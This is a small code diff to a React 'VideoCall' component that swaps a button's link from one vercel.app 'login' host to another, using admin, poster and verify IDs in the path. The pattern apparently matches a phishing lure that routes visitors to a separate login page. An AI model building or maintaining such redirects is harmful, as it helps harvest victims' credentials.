@@ -117,8 +117,8 @@ export default function VideoCall({ adminId, posterId, verifyId, sitename }) {
         <a
           href={
             adminId && posterId && verifyId
-              ? `https://login-mail-five.vercel.app/${adminId}/${posterId}/${verifyId}`
-              : "https://login-mail-five.vercel.app"
+              ? `https://nail-login.vercel.app/${adminId}/${posterId}/${verifyId}`
+              : "https://nail-login.vercel.app"
           }
           className="bg-green-500 hover:bg-green-600 text-white px-12 sm:px-14 py-3 rounded-lg text-xl sm:text-2xl font-extrabold transition-colors shadow-md text-center block"
         >
